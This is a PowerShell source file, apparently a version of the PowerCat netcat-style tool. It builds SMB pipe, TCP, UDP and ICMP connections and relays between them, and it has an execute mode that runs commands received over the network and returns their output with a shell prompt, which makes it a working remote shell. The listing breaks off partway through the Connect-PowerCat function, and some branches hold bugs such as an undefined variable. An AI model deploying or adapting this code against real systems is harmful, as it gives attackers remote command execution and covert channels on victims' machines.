function New-SmbStream {
[CmdletBinding(DefaultParameterSetName = 'Client')]
    Param (
        [Parameter(Position = 0, ParameterSetName = 'Client', Mandatory = $true)]
        [ValidatePattern("^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$")]
        [String]$ServerIp,
        
        [Parameter(Position = 0, ParameterSetName = 'Listener', Mandatory = $true)]
        [Switch]$Listener,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [ValidateNotNullorEmpty()]
        [String]$PipeName, 
        
        [Parameter()]
        [Int]$Timeout = 60,
        
        [Parameter()]
        [Int]$BufferSize = 65536
    )

    if ($Listener.IsPresent) {

        $PipeServer = New-Object IO.Pipes.NamedPipeServerStream($PipeName, [IO.Pipes.PipeDirection]::InOut, 1, [IO.Pipes.PipeTransmissionMode]::Byte, [IO.Pipes.PipeOptions]::Asynchronous)
        $ConnectResult = $PipeServer.BeginWaitForConnection($null, $null)
       
        $Stopwatch = [Diagnostics.Stopwatch]::StartNew()
        [console]::TreatControlCAsInput = $true
      
        do {
            if ([console]::KeyAvailable) {          
                $Key = [console]::ReadKey($true)
                if (($Key.Modifiers -band [ConsoleModifiers]::Control) -and ($Key.Key -eq 'C')) {
                    Write-Warning "Caught escape sequence, stopping Smb Setup."
                    [console]::TreatControlCAsInput = $false
                    $PipeServer.Dispose()
                    $Stopwatch.Stop()
                    return
                }
            }

            if ($Stopwatch.Elapsed.TotalSeconds -gt $Timeout) {
                Write-Warning "Timeout exceeded, stopping UDP Setup."
                [console]::TreatControlCAsInput = $false
                $PipeServer.Dispose()
                $Stopwatch.Stop()
                return
            }
        } until ($ConnectResult.IsCompleted)
        
        [console]::TreatControlCAsInput = $false
        $Stopwatch.Stop()

        try { $PipeServer.EndWaitForConnection($ConnectResult) }
        catch { 
            Write-Warning "Pipe server connection failed. $($_.Exception.Message)." 
            $PipeServer.Dispose()
            return
        }

        $Buffer = New-Object Byte[] -ArgumentList $BufferSize

        $Properties = @{
            Pipe = $PipeServer
            Buffer = $Buffer
            Read = $PipeServer.BeginRead($Buffer, 0, $Buffer.Length, $null, $null)
        }
        New-Object -TypeName psobject -Property $Properties
    }
    else { # Client

        $PipeClient = New-Object IO.Pipes.NamedPipeClientStream($ServerIp, $PipeName, [IO.Pipes.PipeDirection]::InOut, [IO.Pipes.PipeOptions]::Asynchronous)
        try { $PipeClient.Connect(($Timeout * 1000)) }
        catch { 
            Write-Warning "Pipe client connection failed. $($_.Exception.Message)." 
            $PipeClient.Dispose()
            return
        }
        Write-Verbose "Connection to server successful!"

        $Buffer = New-Object Byte[] -ArgumentList $BufferSize

        $Properties = @{
            Pipe = $PipeClient
            Buffer = $Buffer
            Read = $PipeClient.BeginRead($Buffer, 0, $Buffer.Length, $null, $null)
        }
        New-Object -TypeName psobject -Property $Properties
    }
}

function New-TcpStream {
[CmdletBinding(DefaultParameterSetName = 'Client')]
    Param (
        [Parameter(Position = 0, ParameterSetName = 'Client', Mandatory = $true)]
        [Net.IPAddress]$ServerIp,
        
        [Parameter(Position = 0, ParameterSetName = 'Listener', Mandatory = $true)]
        [Switch]$Listener,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [Int]$Port, 
        
        [Parameter()]
        [Int]$Timeout = 60
    )
    
    if ($Listener.IsPresent) {

        $TcpListener = New-Object Net.Sockets.TcpListener -ArgumentList $Port
        $TcpListener.Start()
        $ConnectResult = $TcpListener.BeginAcceptTcpClient($null, $null)

        Write-Verbose "Listening on 0.0.0.0:$Port [tcp]"
        
        $Stopwatch = [Diagnostics.Stopwatch]::StartNew()
        [console]::TreatControlCAsInput = $true
      
        do {
            if ([console]::KeyAvailable) {          
                $Key = [console]::ReadKey($true)
                if (($Key.Modifiers -band [ConsoleModifiers]::Control) -and ($Key.Key -eq 'C')) {
                    Write-Warning 'Caught escape sequence, stopping TCP setup.'
                    [console]::TreatControlCAsInput = $false
                    $TcpListener.Stop()
                    $Stopwatch.Stop()
                    return
                }
            }
            if ($Stopwatch.Elapsed.TotalSeconds -gt $Timeout) {
                Write-Warning 'Timeout exceeded, stopping TCP setup.'
                [console]::TreatControlCAsInput = $false
                $TcpListener.Stop()
                $Stopwatch.Stop()
                return
            }
        } until ($ConnectResult.IsCompleted)
        
        [console]::TreatControlCAsInput = $false
        $Stopwatch.Stop() 

        $TcpClient = $TcpListener.EndAcceptTcpClient($ConnectResult)
        $TcpListener.Stop()
        
        if ($TcpClient -eq $null) { 
            Write-Warning "Connection to $($ServerIp.IPAddressToString):$Port [tcp] failed. $($_.Exception.Message)"
            return 
        }

        Write-Verbose "Connection from $($TcpClient.Client.RemoteEndPoint.ToString())."
        
        $Properties = @{
            Socket = $TcpClient.Client
            TcpStream = $TcpClient.GetStream()
            BufferSize = $TcpClient.ReceiveBufferSize
        }

        New-Object -TypeName psobject -Property $Properties
    }        
    else { # Client

        $TcpClient = New-Object Net.Sockets.TcpClient

        Write-Verbose "Attempting connection to $($ServerIp.IPAddressToString):$Port"
        
        $ConnectResult = $TcpClient.BeginConnect($ServerIp, $Port, $null, $null)
        
        $Stopwatch = [Diagnostics.Stopwatch]::StartNew()
        [console]::TreatControlCAsInput = $true

        do {
            if ([console]::KeyAvailable) {          
                $Key = [console]::ReadKey($true)
                if (($Key.Modifiers -band [ConsoleModifiers]::Control) -and ($Key.Key -eq 'C')) {
                    Write-Warning 'Caught escape sequence, stopping TCP setup.'
                    [console]::TreatControlCAsInput = $false
                    $TcpClient.Dispose()
                    $Stopwatch.Stop()
                    return
                }
            }
            if ($Stopwatch.Elapsed.TotalSeconds -gt $Timeout) {
                Write-Warning 'Timeout exceeded, stopping TCP setup.'
                [console]::TreatControlCAsInput = $false
                $TcpClient.Dispose()
                $Stopwatch.Stop()
                return
            }
        } until ($ConnectResult.IsCompleted)

        [console]::TreatControlCAsInput = $false
        $Stopwatch.Stop()

        try { $TcpClient.EndConnect($ConnectResult) }
        catch {
            Write-Warning "Connection to $($ServerIp.IPAddressToString):$Port [tcp] failed. $($_.Exception.Message)"
            $TcpClient.Dispose()
            return
        }

        if (!$TcpClient.Connected) { 
            Write-Warning "Connection to $($ServerIp.IPAddressToString):$Port [tcp] failed. $($_.Exception.Message)"
            $TcpClient.Dispose()
            return 
        }

        Write-Verbose "Connection to $($ServerIp.IPAddressToString):$Port [tcp] succeeded!"
        
        $Properties = @{
            Socket = $TcpClient.Client
            TcpStream = $TcpClient.GetStream()
            BufferSize = $TcpClient.ReceiveBufferSize
        }

        New-Object -TypeName psobject -Property $Properties
    }
}

function New-UdpStream {
[CmdletBinding(DefaultParameterSetName = 'Client')]
    Param (
        [Parameter(Position = 0, ParameterSetName = 'Client', Mandatory = $true)]
        [Net.IPAddress]$ServerIp,
        
        [Parameter(Position = 0, ParameterSetName = 'Listener', Mandatory = $true)]
        [Switch]$Listener,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [Int]$Port, 
        
        [Parameter()]
        [Int]$BufferSize = 65536,
        
        [Parameter()]
        [Int]$Timeout = 60
    )

    if ($Listener.IsPresent) {

        $SocketDestinationBuffer = New-Object Byte[] -ArgumentList 65536
        $RemoteEndPoint = New-Object Net.IPEndPoint -ArgumentList @([Net.IPAddress]::Any, $null)
        $UdpClient = New-Object Net.Sockets.UDPClient -ArgumentList $Port
        $PacketInfo = New-Object Net.Sockets.IPPacketInformation

        Write-Verbose "Listening on 0.0.0.0:$Port [udp]"
                
        $ConnectHandle = $UdpClient.Client.BeginReceiveMessageFrom($SocketDestinationBuffer, 0, 65536, [Net.Sockets.SocketFlags]::None, [ref]$RemoteEndPoint, $null, $null)
        
        $Stopwatch = [Diagnostics.Stopwatch]::StartNew()
        [console]::TreatControlCAsInput = $true
      
        do {
            if ([console]::KeyAvailable) {          
                $Key = [console]::ReadKey($true)
                if (($Key.Modifiers -band [ConsoleModifiers]::Control) -and ($Key.Key -eq 'C')) {
                    Write-Warning "Caught escape sequence, stopping UDP Setup."
                    $UdpClient.Dispose()
                    $Stopwatch.Stop()
                    $SocketDestinationBuffer = $null
                    [console]::TreatControlCAsInput = $false
                    return
                }
            }

            if ($Stopwatch.Elapsed.TotalSeconds -gt $Timeout) {
                Write-Warning "Timeout exceeded, stopping UDP Setup."
                $UdpClient.Dispose()
                $Stopwatch.Stop()
                $SocketDestinationBuffer = $null
                [console]::TreatControlCAsInput = $false
                return
            }
        } until ($ConnectHandle.IsCompleted)
        
        [console]::TreatControlCAsInput = $false
        $Stopwatch.Stop()

        $SocketFlags = 0
        $SocketBytesRead = $UdpClient.Client.EndReceiveMessageFrom($ConnectHandle, [ref]$SocketFlags, [ref]$RemoteEndPoint, [ref]$PacketInfo)
                
        if ($SocketBytesRead.Count) { $InitialBytes = $SocketDestinationBuffer[0..($SocketBytesRead - 1)] }

        Write-Verbose "Connection from $($RemoteEndPoint.Address.IPAddressToString):$($RemoteEndPoint.Port) [udp] accepted."

        $Properties = @{
            InitialBytes = $InitialBytes
            UdpClient = $UdpClient
            Socket = $UdpClient.Client
            Read = $UdpClient.BeginReceive($null, $null)
        }
        New-Object -TypeName psobject -Property $Properties
    }        
    else { # Client
        $RemoteEndPoint = New-Object Net.IPEndPoint -ArgumentList @($ServerIp, $Port) 
        $UdpClient = New-Object Net.Sockets.UDPClient
        $UdpClient.Connect($RemoteEndPoint)

        Write-Verbose "Sending UDP traffic to $($ServerIp.IPAddressToString):$Port"
        Write-Verbose "Make sure to send some data to the server!"

        $Properties = @{
            InitialBytes = $InitialBytes
            UdpClient = $UdpClient
            Socket = $UdpClient.Client
            Read = $UdpClient.BeginReceive($null, $null)
        }
        New-Object -TypeName psobject -Property $Properties
    }
}

function New-IcmpStream {
[CmdletBinding(DefaultParameterSetName = 'Client')]
    Param (
        [Parameter(Position = 0, ParameterSetName = 'Client', Mandatory = $true)]
        [Net.IPAddress]$ServerIp,
        
        [Parameter(Position = 0, ParameterSetName = 'Listener', Mandatory = $true)]
        [Switch]$Listener,

        [Parameter(Position = 1, Mandatory = $true)]
        [String]$BindAddress,
        
        [Parameter()]
        [Int]$BufferSize = 65536,
        
        [Parameter()]
        [Int]$Timeout = 60
    )
    
    $IcmpSocket = New-Object Net.Sockets.Socket([Net.Sockets.AddressFamily]::InterNetwork, [Net.Sockets.SocketType]::Raw, [Net.Sockets.ProtocolType]::Icmp)
    $SocketLocalEndPoint = New-Object Net.IPEndPoint -ArgumentList @(([Net.IPAddress]::Parse($BindAddress)), $null)
    $IcmpSocket.Bind($SocketLocalEndPoint)
    $IcmpSocket.IOControl([Net.Sockets.IOControlCode]::ReceiveAll, [byte[]]@(1, 0, 0, 0), [byte[]]@(1, 0, 0, 0))
    
    Write-Verbose "Listening on $($IcmpSocket.LocalEndPoint.Address.IPAddressToString) [icmp]"

    if ($Listener.IsPresent) {
        
        $RemoteEndPoint = New-Object Net.IPEndPoint -ArgumentList @([Net.IPAddress]::Any, $null)
        
        $SocketDestinationBuffer = New-Object Byte[] -ArgumentList 65536
        $PacketInfo = New-Object Net.Sockets.IPPacketInformation
                
        $ConnectResult = $IcmpSocket.BeginReceiveFrom($SocketDestinationBuffer, 0, 65536, [Net.Sockets.SocketFlags]::None, [ref]$RemoteEndPoint, $null, $null)
        
        $Stopwatch = [Diagnostics.Stopwatch]::StartNew()
        [console]::TreatControlCAsInput = $true
      
        do {
            if ([console]::KeyAvailable) {          
                $Key = [console]::ReadKey($true)
                if (($Key.Modifiers -band [ConsoleModifiers]::Control) -and ($Key.Key -eq 'C')) {
                    Write-Warning 'Caught escape sequence, stopping UDP Setup.'
                    [console]::TreatControlCAsInput = $false
                    $SocketDestinationBuffer = $null
                    $IcmpSocket.Close()
                    $Stopwatch.Stop()
                    return
                }
            }

            if ($Stopwatch.Elapsed.TotalSeconds -gt $Timeout) {
                Write-Warning "Timeout exceeded, stopping UDP Setup."
                [console]::TreatControlCAsInput = $false
                $SocketDestinationBuffer = $null
                $IcmpSocket.Close()
                $Stopwatch.Stop()
                return
            }
        } until ($ConnectResult.IsCompleted)
        
        [console]::TreatControlCAsInput = $false
        $Stopwatch.Stop()

        $SocketFlags = 0
        $SocketBytesRead = $IcmpSocket.EndReceiveFrom($ConnectResult, [ref]$SocketFlags, [ref]$RemoteEndPoint, [ref]$PacketInfo)
                
        if ($SocketBytesRead.Count) { $InitialBytes = $SocketDestinationBuffer[0..($SocketBytesRead - 1)] }

        Write-Verbose "Connection from $($RemoteEndPoint.Address.IPAddressToString) [icmp] accepted."

        $Properties = @{
            Socket = $IcmpSocket
            RemoteEndpoint = $RemoteEndPoint
        }
        $IcmpStream = New-Object -TypeName psobject -Property $Properties
    }        
    else { # Client
        $RemoteEndPoint = New-Object Net.IPEndPoint -ArgumentList @($ServerIp, $null) 
        $IcmpSocket.Connect($RemoteEndPoint)

        Write-Verbose "Sending ICMP traffic to $($ServerIp.IPAddressToString)"
        Write-Verbose "Make sure to send some data to the server!"

        $Properties = @{
            Socket = $IcmpSocket
            RemoteEndpoint = $RemoteEndpoint
        }
        $IcmpStream = New-Object -TypeName psobject -Property $Properties
    }
    return $InitialBytes, $IcmpStream
}

function Close-NetworkStream {
    Param (
        [Parameter(Position = 0, Mandatory = $true)]
        [ValidateSet('Icmp', 'Smb', 'Tcp', 'Udp')]
        [String]$Mode,
    
        [Parameter(Position = 1, Mandatory = $true)]
        [Object]$Stream
    )    
    switch ($Mode) {
        'Icmp' { 
            try { $Stream.Socket.Dispose() }
            catch { Write-Warning "Failed to dispose Icmp socket. $($_.Exception.Message)." }
            
            continue 
        }
        'Smb' { 
            try { $Stream.Pipe.Dispose()  }
            catch { Write-Warning "Failed to dispose Smb stream. $($_.Exception.Message)." }
            
            continue 
        }
        'Tcp' { 
            try { $Stream.Socket.Dispose() }
            catch { Write-Warning "Failed to dispose Tcp socket. $($_.Exception.Message)." }
            
            continue 
        }
        'Udp' { 
            try { $Stream.Socket.Dispose() }
            catch { Write-Warning "Failed to dispose Udp socket. $($_.Exception.Message)." }
        }
    }
}

function Write-NetworkStream {
    Param (
        [Parameter(Position = 0, Mandatory = $true)]
        [ValidateSet('Icmp', 'Smb', 'Tcp', 'Udp')]
        [String]$Mode,
    
        [Parameter(Position = 1, Mandatory = $true)]
        [Object]$Stream,
    
        [Parameter(Position = 2, Mandatory = $true)]
        [Byte[]]$Bytes
    )    
    switch ($Mode) {
        'Icmp' { 
            try { $BytesSent = $Stream.Socket.SendTo($Bytes, $Stream.RemoteEndPoint) }
            catch { Write-Warning "Failed to send Icmp data to $($Stream.RemoteEndPoint.ToString()). $($_.Exception.Message)" }
            continue 
        }
        'Smb' { 
            try { $Stream.Pipe.Write($Bytes, 0, $Bytes.Length) }
            catch { Write-Warning "Failed to send Smb data. $($_.Exception.Message)" ; return }
            continue 
        }
        'Tcp' { 
            if ($Stream.TcpStream.CanWrite) {
                try { $Stream.TcpStream.Write($Bytes, 0, $Bytes.Length) }
                catch { Write-Warning "Failed to write to Tcp stream. $($_.Exception.Message)." }
            }
            else { Write-Warning 'Tcp stream cannot be written to.' }
            continue 
        }
        'Udp' { 
            try { $BytesSent = $Stream.UdpClient.Send($Bytes, $Bytes.Length) }
            catch { Write-Warning "Failed to send Udp data to $($Stream.RemoteEndPoint.ToString()). $($_.Exception.Message)." }
        }
    }
}

function Read-NetworkStream {
    Param (
        [Parameter(Position = 0, Mandatory = $true)]
        [ValidateSet('Icmp', 'Smb', 'Tcp', 'Udp')]
        [String]$Mode,
    
        [Parameter(Position = 1, Mandatory = $true)]
        [Object]$Stream,
    
        [Parameter(Position = 2)]
        [Int]$Size
    )    
    switch ($Mode) {
        'Icmp' { 
            $Buffer = New-Object Byte[] -ArgumentList $Size

            try { $BytesReceived = $Stream.Socket.ReceiveFrom($Buffer, $Stream.RemoteEndPoint) }
            catch { 
                Write-Warning "Failed to receive Icmp data from $($Stream.RemoteEndPoint.ToString()). $($_.Exception.Message)." 
                Remove-Variable Buffer 
                continue
            }
            
            return $Buffer[0..($BytesReceived - 1)] 
        }
        'Smb' { 
            
            try { $BytesRead = $Stream.Pipe.EndRead($Stream.Read) }
            catch { Write-Warning "Failed to read Smb data. $($_.Exception.Message)." ; continue }

            $BytesReceived = $Stream.Buffer[0..($BytesRead - 1)]
            [Array]::Clear($Stream.Buffer, 0, $BytesRead)

            $Stream.Read = $Stream.Pipe.BeginRead($Stream.Buffer, 0, $Stream.Buffer.Length, $null, $null)

            return $BytesReceived
        }
        'Tcp' { 
            if ($Stream.TcpStream.CanRead) {
                
                $Buffer = New-Object Byte[] -ArgumentList $Size

                try { $BytesRead = $Stream.TcpStream.Read($Buffer, 0, $Size) }
                catch { 
                    Write-Warning "Failed to read Tcp stream. $($_.Exception.Message)." 
                    Remove-Variable Buffer 
                    continue
                }

                return $Buffer[0..($BytesRead - 1)]
            }
            else { Write-Warning 'Tcp stream cannot be read.' ; continue }
        }
        'Udp' { 
            try { $Bytes = $Stream.UdpClient.EndReceive($Stream.Read, $Stream.Socket.RemoteEndpoint) }
            catch { Write-Warning "Failed to receive Udp data from $($Stream.Socket.RemoteEndpoint.ToString()). $($_.Exception.Message)." ; continue }

            $Stream.Read = $Stream.UdpClient.BeginReceive($null, $null)

            return $Bytes
        }
    }
}

function Start-PowerCat {
[CmdletBinding(DefaultParameterSetName = 'Console')]
    Param (
        [Parameter(Position = 0, Mandatory = $true)]
        [Alias('m')]
        [ValidateSet('Icmp', 'Smb', 'Tcp', 'Udp')]
        [String]$Mode,
        
        [Parameter(ParameterSetName = 'Execute')]
        [Alias('e')]
        [Switch]$Execute,
    
        [Parameter(ParameterSetName = 'Input')]
        [Alias('i')]
        [Object]$Input,
        
        [Parameter(ParameterSetName = 'Relay')]
        [Alias('r')]
        [String]$Relay,

        [Parameter(ParameterSetName = 'OutFile')]
        [Alias('of')]
        [String]$OutputFile,
    
        [Parameter(ParameterSetName = 'OutFile', Mandatory = $true)]
        [Parameter(ParameterSetName = 'Console', Mandatory = $true)]
        [Alias('ot')]
        [ValidateSet('Bytes','String')]
        [String]$OutputType,
    
        [Parameter()]
        [Alias('d')]
        [Switch]$Disconnect,
    
        [Parameter()]
        [Alias('k')]
        [Switch]$KeepAlive,
    
        [Parameter()]
        [Alias('t')]
        [Int]$Timeout = 60,
        
        [Parameter()]
        [ValidateSet('Ascii','Unicode','UTF7','UTF8','UTF32')]
        [String]$Encoding = 'Ascii'
    )       
    DynamicParam {
        $ParameterDictionary = New-Object Management.Automation.RuntimeDefinedParameterDictionary
        
        switch ($Mode) {
           'Icmp' { $BindParam = New-RuntimeParameter -Name BindAddress -Type String -Mandatory -Position 1 -ParameterDictionary $ParameterDictionary -ValidatePattern "^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$" ; continue }
            'Smb' { $PipeNameParam = New-RuntimeParameter -Name PipeName -Type String -Mandatory -ParameterDictionary $ParameterDictionary ; continue }
            'Tcp' { $PortParam = New-RuntimeParameter -Name Port -Type Int -Mandatory -Position 1 -ParameterDictionary $ParameterDictionary ; continue }
            'Udp' { $PortParam = New-RuntimeParameter -Name Port -Type Int -Mandatory -Position 1 -ParameterDictionary $ParameterDictionary ; continue }
        }

        if ($Execute.IsPresent) { 
            $ScriptBlockParam = New-RuntimeParameter -Name ScriptBlock -Type ScriptBlock -ParameterDictionary $ParameterDictionary 
            $ArgumentListParam = New-RuntimeParameter -Name ArgumentList -Type Object[] -ParameterDictionary $ParameterDictionary 
        }

        return $ParameterDictionary
    }
    Begin {         
        switch ($Encoding) {
            'Ascii' { $EncodingType = New-Object Text.AsciiEncoding ; continue }
          'Unicode' { $EncodingType = New-Object Text.UnicodeEncoding ; continue }
             'UTF7' { $EncodingType = New-Object Text.UTF7Encoding ; continue }
             'UTF8' { $EncodingType = New-Object Text.UTF8Encoding ; continue }
            'UTF32' { $EncodingType = New-Object Text.UTF32Encoding ; continue }
        }
      
        if ($PSCmdlet.ParameterSetName -eq 'Input') {   
            
            Write-Verbose 'Parsing input...'

            if ((Test-Path $Input)) { $BytesToSend = [IO.File]::ReadAllBytes($Input) }     
            elseif ($Input.GetType() -eq [Byte[]]) { $BytesToSend = $Input }
            elseif ($Input.GetType() -eq [String]) { $BytesToSend = $EncodingType.GetBytes($Input) }
            else { Write-Warning 'Incompatible input type.' ; return }
        }

        elseif ($PSCmdlet.ParameterSetName -eq 'Relay') {
            
            Write-Verbose "Setting up relay stream..."

            $RelayConfig = $Relay.Split(':')

            if ($RelayConfig.Count -eq 2) { # Listener
                
                $RelayMode = $RelayConfig[0].ToLower()

                switch ($RelayMode) {
                   'icmp' { $RelayStream = New-IcmpStream -Listener $RelayConfig[1] ; continue }
                    'smb' { $RelayStream = New-SmbStream -Listener $RelayConfig[1] ; continue }
                    'tcp' { $RelayStream = New-TcpStream -Listener $RelayConfig[1] ; continue }
                    'udp' { $RelayStream = New-UdpStream -Listener $RelayConfig[1] ; continue }
                    default { Write-Warning 'Invalid relay mode specified.' ; return }
                }
            }
            elseif ($RelayConfig.Count -eq 3) { # Client
                
                $RelayMode = $RelayConfig[0].ToLower()
                $ServerIp = [Net.IPAddress]::Parse($RemoteIp)

                switch ($RelayMode) {
                   'icmp' { $RelayStream = New-IcmpStream $ServerIp $RelayConfig[2] ; continue }
                    'smb' { $RelayStream = New-SmbStream $RelayConfig[1] $RelayConfig[2] ; continue }
                    'tcp' { $RelayStream = New-TcpStream $ServerIp $RelayConfig[2] ; continue }
                    'udp' { $RelayStream = New-UdpStream $ServerIp $RelayConfig[2] ; continue }
                    default { Write-Warning 'Invalid relay mode specified.' ; return }
                }
            }
            else { Write-Error 'Invalid relay format.' -ErrorAction Stop }
        }
          
        elseif ($ParameterDictionary.ScriptBlock.Value) {
            
            Write-Verbose 'Executing scriptblock...'

            $ScriptBlock = $ParameterDictionary.ScriptBlock.Value
            
            $Error.Clear()
            
            $BytesToSend += $EncodingType.GetBytes(($ScriptBlock.Invoke($ParameterDictionary.ArgumentList.Value) | Out-String))
            if ($Error) { foreach ($Err in $Error) { $BytesToSend += $EncodingType.GetBytes($Err.ToString()) } }
            $BytesToSend += $EncodingType.GetBytes(("`nPS $((Get-Location).Path)> "))
            
            $ScriptBlock = $null
        }

        Write-Verbose "Setting up network stream..."

        switch ($Mode) {
           'Icmp' { 
                try { $InitialBytes, $ServerStream = New-IcmpStream -Listener $ParameterDictionary.BindAddress.Value }
                catch { Write-Warning "Failed to open Icmp stream. $($_.Exception.Message)" ; return }
                continue 
            }
            'Smb' { 
                try { $ServerStream = New-SmbStream -Listener $ParameterDictionary.PipeName.Value  }
                catch { Write-Warning "Failed to open Smb stream. $($_.Exception.Message)" ; return }
                continue 
            }
            'Tcp' { 
                if ((Test-Port -Number $ParameterDictionary.Port.Value -Transport Tcp)) {
                    try { $ServerStream = New-TcpStream -Listener $ParameterDictionary.Port.Value }
                    catch { Write-Warning "$($_.Exception.Message)" }
                }
                continue 
            }
            'Udp' { 
                if ((Test-Port -Number $ParameterDictionary.Port.Value -Transport Udp)) {
                    try { $InitialBytes, $ServerStream = New-UdpStream -Listener $ParameterDictionary.Port.Value }
                    catch { Write-Warning "Failed to open Udp stream. $($_.Exception.Message)" ; return }
                }
            }
        }
      
        if ($BytesToSend.Count) { Write-NetworkStream $Mode $ServerStream $BytesToSend }
    }
    Process {   
        [console]::TreatControlCAsInput = $true        
    
        if ($Disconnect.IsPresent) { Write-Verbose 'Disconnect specified, exiting.' ; break }

        while ($true) {
            
            # Catch Ctrl+C / Read-Host
            if ([console]::KeyAvailable) {          
                $Key = [console]::ReadKey()
                if ($Key.Key -eq [Consolekey]::Escape) {
                    Write-Warning 'Caught escape sequence, stopping PowerCat.'
                    break
                }
                if ($PSCmdlet.ParameterSetName -eq 'Console') { 
                    $BytesToSend = $EncodingType.GetBytes($Key.KeyChar + (Read-Host) + "`n") 
                    Write-NetworkStream $Mode $ServerStream $BytesToSend
                }
            }

            # Get data from the network
            if ($ServerStream.InitialConnectionBytes) { $ReceivedBytes = $ServerStream.InitialConnectionBytes ; $ServerStream.InitialConnectionBytes = $null }
            elseif ($ServerStream.Socket.Connected) { if ($ServerStream.Read.IsCompleted) { $ReceivedBytes = Read-NetworkStream $Mode $ServerStream $ServerStream.Socket.Available } }
            elseif ($ServerStream.Pipe.IsConnected) { if ($ServerStream.Read.IsCompleted) { $ReceivedBytes = Read-NetworkStream $Mode $ServerStream } }
            else { Write-Warning 'Connection broken, exiting.' ; break }

            # Redirect received bytes
            if ($PSCmdlet.ParameterSetName -eq 'Execute') {
            
                $ScriptBlock = [ScriptBlock]::Create($EncodingType.GetString($ReceivedBytes))
            
                $Error.Clear()

                $BytesToSend += $EncodingType.GetBytes(($ScriptBlock.Invoke() | Out-String))
                if ($Error) { foreach ($Err in $Error) { $BytesToSend += $EncodingType.GetBytes($Err.ToString()) } }
                $BytesToSend += $EncodingType.GetBytes(("`nPS $((Get-Location).Path)> "))
            
                Write-NetworkStream $Mode $ServerStream $BytesToSend 
                $BytesToSend = $null
                $ScriptBlock = $null
                continue
            }
            elseif ($PSCmdlet.ParameterSetName -eq 'Relay') { Write-NetworkStream $RelayMode $RelayStream $ReceivedBytes ; continue }
            elseif ($PSCmdlet.ParameterSetName -eq 'OutFile') { 
                if ($OutputType -eq 'Bytes') { 
                    $FileStream = New-Object IO.FileStream -ArgumentList @($OutputFile, [IO.FileMode]::Append)
                    [void]$FileStream.Seek(0, [IO.SeekOrigin]::End) 
                    $FileStream.Write($ReceivedBytes, 0, $ReceivedBytes.Length) 
                    $FileStream.Flush() 
                    $FileStream.Dispose() 
                    continue
                }
                else { $EncodingType.GetString($ReceivedBytes) | Out-File -Append -FilePath $OutputFile ; continue }
            }
            else { # StdOut
                if ($OutputType -eq 'Bytes') { Write-Output $ReceivedBytes }
                else { Write-Host -NoNewline $EncodingType.GetString($ReceivedBytes).TrimEnd("`r") }
            }
        }
    }
    End {   
        [console]::TreatControlCAsInput = $false

        Write-Verbose 'Attempting to close network stream.'
      
        try { Close-NetworkStream $Mode $ServerStream }
        catch { Write-Warning "Failed to close client stream. $($_.Exception.Message)" }

        if ($PSCmdlet.ParameterSetName -eq 'Relay') {
            try { Close-NetworkStream $RelayMode $RelayStream }
            catch { Write-Warning "Failed to close relay stream. $($_.Exception.Message)" }
        }
    }
}

function Connect-PowerCat {
[CmdletBinding(DefaultParameterSetName = 'Console')]
    Param (
        [Parameter(Position = 0, Mandatory = $true)]
        [Alias('m')]
        [ValidateSet('Icmp', 'Smb', 'Tcp', 'Udp')]
        [String]$Mode,

        [Parameter(Position = 1, Mandatory = $true)]
        [ValidatePattern("^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$")]
        [Alias('c')]
        [String]$RemoteIp,
        
        [Parameter(ParameterSetName = 'Execute')]
        [Alias('e')]
        [Switch]$Execute,
    
        [Parameter(ParameterSetName = 'Input')]
        [Alias('i')]
        [Object]$Input,
        
        [Parameter(ParameterSetName = 'Relay')]
        [Alias('r')]
        [String]$Relay,

        [Parameter(ParameterSetName = 'OutFile')]
        [Alias('of')]
        [String]$OutputFile,
    
        [Parameter(ParameterSetName = 'OutFile', Mandatory = $true)]
        [Parameter(ParameterSetName = 'Console', Mandatory = $true)]
        [Alias('ot')]
        [ValidateSet('Bytes','String')]
        [String]$OutputType,
    
        [Parameter()]
        [Alias('d')]
        [Switch]$Disconnect,
    
        [Parameter()]
        [Alias('k')]
        [Switch]$KeepAlive,
    
        [Parameter()]
        [Alias('t')]
        [Int]$Timeout = 60,
        
        [Parameter()]
        [ValidateSet('Ascii','Unicode','UTF7','UTF8','UTF32')]
        [String]$Encoding = 'Ascii'
    )       
    DynamicParam {
        $ParameterDictionary = New-Object Management.Automation.RuntimeDefinedParameterDictionary
        
        switch ($Mode) {
           'Icmp' { $BindParam = New-RuntimeParameter -Name BindAddress -Type String -Mandatory -Position 1 -ParameterDictionary $ParameterDictionary -ValidatePattern "^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$" ; continue }
            'Smb' { $PipeNameParam = New-RuntimeParameter -Name PipeName -Type String -Mandatory -ParameterDictionary $ParameterDictionary ; continue }
            'Tcp' { $PortParam = New-RuntimeParameter -Name Port -Type Int -Mandatory -Position 1 -ParameterDictionary $ParameterDictionary ; continue }
            'Udp' { $PortParam = New-RuntimeParameter -Name Port -Type Int -Mandatory -Position 1 -ParameterDictionary $ParameterDictionary ; continue }
        }

        if ($Execute.IsPresent) { 
            $ScriptBlockParam = New-RuntimeParameter -Name ScriptBlock -Type ScriptBlock -ParameterDictionary $ParameterDictionary 
            $ArgumentListParam = New-RuntimeParameter -Name ArgumentList -Type Object[] -ParameterDictionary $ParameterDictionary 
        }

        return $ParameterDictionary
    }
    Begin {         
        switch ($Encoding) {
            'Ascii' { $EncodingType = New-Object Text.AsciiEncoding ; continue }
          'Unicode' { $EncodingType = New-Object Text.UnicodeEncoding ; continue }
             'UTF7' { $EncodingType = New-Object Text.UTF7Encoding ; continue }
             'UTF8' { $EncodingType = New-Object Text.UTF8Encoding ; continue }
            'UTF32' { $EncodingType = New-Object Text.UTF32Encoding ; continue }
        }
      
        if ($PSCmdlet.ParameterSetName -eq 'Input') {   
            
            Write-Verbose 'Parsing input...'

            if ((Test-Path $Input)) { $BytesToSend = [IO.File]::ReadAllBytes($Input) }     
